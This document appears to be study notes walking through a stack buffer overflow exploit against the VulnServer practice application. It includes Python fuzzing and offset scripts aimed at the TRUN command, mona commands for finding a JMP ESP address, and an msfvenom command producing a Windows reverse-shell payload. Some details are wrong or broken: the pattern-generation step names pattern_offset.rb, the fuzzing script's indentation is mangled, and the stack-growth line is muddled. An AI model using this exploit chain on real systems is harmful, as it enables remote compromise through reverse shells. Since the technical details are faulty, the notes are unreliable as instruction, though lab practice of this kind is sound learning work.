- A buffer overflow is when an attacker write more than what is expected in a certain part of the memory, and that overflow flows to other part of memory.
- https://www.google.com/url?sa=t&source=web&rct=j&url=https%3A%2F%2Fwww.packtpub.com%2Fen-IN%2Fproduct%2Fmastering-metasploit-second-edition-9781786463166%2Fchapter%2F3-the-exploit-formulation-process-3%2Fsection%2Fexploiting-stack-based-buffer-overflows-with-metasploit-ch03lvl1sec28%3Fsrsltid%3DAfmBOoo1zLD4WIu7-B9fXv1qlkBWGX-GP_Uj7jOH_8_oRjSv_iqrRmrP&ved=0CBYQjRxqFwoTCICP_fHF85UDFQAAAAAdAAAAABA3&opi=89978449
- https://www.google.com/url?sa=t&source=web&rct=j&url=https%3A%2F%2Fwww.semanticscholar.org%2Fpaper%2FThe-Buffer-Overflow-Attack-and-How-to-Solve-Buffer-ALHusayn%2Fd59f80861f46722e4086b824e7de9c4ce52f5b35&ved=0CBYQjRxqGAoTCICP_fHF85UDFQAAAAAdAAAAABCMAQ&opi=89978449https://www.google.com/url?sa=t&source=web&rct=j&url=https%3A%2F%2Fwww.semanticscholar.org%2Fpaper%2FThe-Buffer-Overflow-Attack-and-How-to-Solve-Buffer-ALHusayn%2Fd59f80861f46722e4086b824e7de9c4ce52f5b35&ved=0CBYQjRxqGAoTCICP_fHF85UDFQAAAAAdAAAAABCMAQ&opi=89978449
- stack grows up to lower addresses.
- ESP: register conatins the memory address to the top of the stack.
- EBP:register contains the memory address to the bottom of the stack.

## Spiking 
- Spiking is the first step you take to find a vulnerability.
- It is a process of probing an application to dicover which command or input are susceptible to buffer overflow.
- generic_send_tcp is a tool used for spiking of buffer overflow to find a vulnerable command.
	- generic_send_tcp host port spike_script 0 0 

## Fuzzing
- Fuzzing is the process of sending increasingly large amounts of data to the vulnerable command to find the exact buffer size that crashes the program.
	- The code looks like this :
		#!/usr/bin/env python3

		import socket
		import sys
		from time import sleep

		host = "***.**.***.***"   # Change to Windows VM IP
		port = 9999

		buffer = "A" * 100

		while True:
	    try:
        print(f"[*] Sending {len(buffer)} bytes")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)

        s.connect((host, port))
        s.recv(1024)  # Receive the application banner

        s.sendall(("TRUN /.:/" + buffer + "\r\n").encode())

        s.close()

        buffer += "A" * 100
        sleep(1)

	    except Exception as e:
        print(f"\n[!] Exception: {e}")
        print(f"[!] crashed at approximately {len(buffer)} bytes")
        sys.exit(0)

		 

## Finding the Offset
- After finding the approximate buffer size that crashes the program , its needed to find the exact offset,the precise number of bytes required to overwrite the **EIP** (Extended Instruction Pointer).
- The EIP is the register that tells the CPU where to execute the next instruction. If you can control EIP, you can redirect the program to your malicious code.
	- To do so first you type :
		- /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 this will produce a long string that we will use later.
		- then we will run a python file that got a this code :
			#!/usr/bin/env python3

			import socket
			import sys

			offset = ""
			try:
			    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.settimeout(3)
			    s.connect(("172.16.199.131", 9999))
			    s.recv(1024)  # Receive VulnServer banner
			    s.sendall(("TRUN /.:/" + offset + "\r\n").encode())
			    s.close()

			except Exception as e:
			    print(f"Error connecting to server: {e}")
			    sys.exit()
		- Inside the offset we add the string and the output will tell you the offset 
		- e.g., "Exact match at offset 2003". This means the first 2003 bytes of your buffer go to the stack, and the next 4 bytes overwrite the EIP.
## Finding Bad Characters
- Bad characters are bytes that interfere with your exploit, causing it to fail. The most common bad character is the **null byte** (`\x00`), which in C programming acts as a string terminator—anything after a null byte gets cut off.

## Finding the Right Module
- Even after gaining control of EIP, you need a reliable way to redirect execution to your shellcode. Since memory addresses change between program runs (due to ASLR), you need to find a **fixed address** within a module. The right module has no memory protections like **ASLR** or SafeSEH.
	- steps:
		!mona modules
		!mona find -s "\xff\xe4" -m <module_name.dll>
		!mona jmp -r esp -cpb "\x00\x0a\x0d"


msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -b "\x00\x0a\x0d" -f c